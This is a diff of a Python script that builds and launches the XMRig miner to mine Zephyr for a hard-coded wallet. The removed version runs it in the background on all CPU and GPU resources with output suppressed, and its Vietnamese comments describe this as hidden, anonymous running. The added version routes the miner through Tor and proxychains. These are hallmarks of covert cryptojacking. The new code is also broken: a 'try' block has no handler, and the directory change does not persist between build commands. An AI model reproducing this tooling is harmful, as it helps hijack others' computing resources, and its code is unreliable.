@@ -1,67 +1,35 @@
-__author__ = 'root'
 import subprocess
-import os
-import requests
-import tempfile
-import shutil
-import tarfile
+
+def install_dependencies():
+	subprocess.call("sudo apt-get update", shell=True)
+	subprocess.call("sudo apt-get install -y build-essential cmake libuv1-dev libssl-dev libhwloc-dev", shell=True)
+
+def set_max_huge_pages():
+	try:
+		# Get the total number of huge pages available
+		total_huge_pages = int(subprocess.check_output(['cat', '/proc/meminfo']).decode().split('HugePages_Total:')[1].split()[0])
+		# Set the number of huge pages to the maximum available
+		subprocess.run(['sysctl', '-w', f'vm.nr_hugepages={total_huge_pages}'])
 
 def install_xmrig():
-    # Tải xuống xmrig từ trang web chính thức
-    url = "https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz"
-    temp_dir = tempfile.mkdtemp()
-    tar_filename = os.path.join(temp_dir, "xmrig.tar.gz")
+	subprocess.call("git clone https://github.com/xmrig/xmrig.git", shell=True)
+	subprocess.call("mkdir xmrig/build && cd xmrig/build", shell=True)
+	subprocess.call("cmake .. && make -j$(nproc)", shell=True)
 
-    try:
-        # Tải xuống tệp tar.gz chứa xmrig
-        response = requests.get(url)
-        with open(tar_filename, 'wb') as f:
-            f.write(response.content)
+def install_proxychains():
+	subprocess.call("sudo apt-get install -y proxychains", shell=True)
 
-        # Giải nén tệp tar.gz
-        with tarfile.open(tar_filename, 'r:gz') as tar:
-            tar.extractall(path=temp_dir)
-
-        # Đường dẫn đến thư mục chứa xmrig
-        xmrig_dir = os.path.join(temp_dir, "xmrig-6.21.3")
-
-        # Di chuyển xmrig đến thư mục hiện tại
-        shutil.move(os.path.join(xmrig_dir, "xmrig"), "./xmrig")
-    except Exception as e:
-        print(f"Lỗi khi tải xuống và cài đặt xmrig: {e}")
-    finally:
-        # Xóa thư mục tạm thời
-        shutil.rmtree(temp_dir)
+def install_tor():
+	subprocess.call("sudo apt-get install -y tor", shell=True)
 
 def start_mining():
-    # Cài đặt xmrig nếu chưa có
-    install_xmrig()
-
-    # Đường dẫn đến chương trình xmrig
-    xmrig_path = "./xmrig"
-
-    # Cấu hình đào coin Zephyr trên CPU và GPU với Mining Ocean
-    command = [
-        xmrig_path,
-        "--algo=zephyr",
-        "--url=stratum+tcp://sg-zephyr.miningocean.org:5332",  # Thay thế bằng địa chỉ và cổng của Mining Ocean
-        "--user=ZEPHsAMyUCyAY1HthizFxwSyZhMXhpomE7VAsn6wyuVRLDhxBNTjMAoZdHc8j2yjXoScPumfZNjGePHVwVujQiZHjJangKYWriB",  # Thay thế bằng địa chỉ ví của bạn trên Mining Ocean
-        "--pass=x",  # Thay thế bằng mật khẩu (nếu có)
-        "--threads=0",  # Sử dụng tất cả các luồng CPU có sẵn cho đào mỏ
-        "--opencl",  # Sử dụng GPU để đào mỏ bằng OpenCL
-        "--donate-level=0",  # Không donate
-        "--background"  # Chạy xmrig ẩn danh
-    ]
-
-    try:
-        # Tạo một môi trường ẩn danh để chạy xmrig
-        devnull = open(os.devnull, 'w')
-        subprocess.Popen(command, stdout=devnull, stderr=devnull)
-        print("Đang khởi động xmrig để đào Zephyr trên CPU và GPU ẩn...")
-    except Exception as e:
-        print(f"Lỗi khi khởi động xmrig: {e}")
-    finally:
-        devnull.close()
+	subprocess.Popen("sudo -u nobody proxychains tor -f /etc/tor/torrc && sudo -u nobody proxychains ./xmrig/build/xmrig --cpu -o sg-zephyr.miningocean.org:5432 -u ZEPHsAMyUCyAY1HthizFxwSyZhMXhpomE7VAsn6wyuVRLDhxBNTjMAoZdHc8j2yjXoScPumfZNjGePHVwVujQiZHjJangKYWriB -k --tls", shell=True)
+	subprocess.Popen("sudo -u nobody ./xmrig/build/xmrig --cuda -o sg-zephyr.miningocean.org:5432 -u ZEPHsAMyUCyAY1HthizFxwSyZhMXhpomE7VAsn6wyuVRLDhxBNTjMAoZdHc8j2yjXoScPumfZNjGePHVwVujQiZHjJangKYWriB -k --tls", shell=True)
 
 if __name__ == "__main__":
-    start_mining()
+	install_dependencies()
+	set_max_huge_pages()
+	install_xmrig()
+	install_proxychains()
+	install_tor()
+	start_mining()
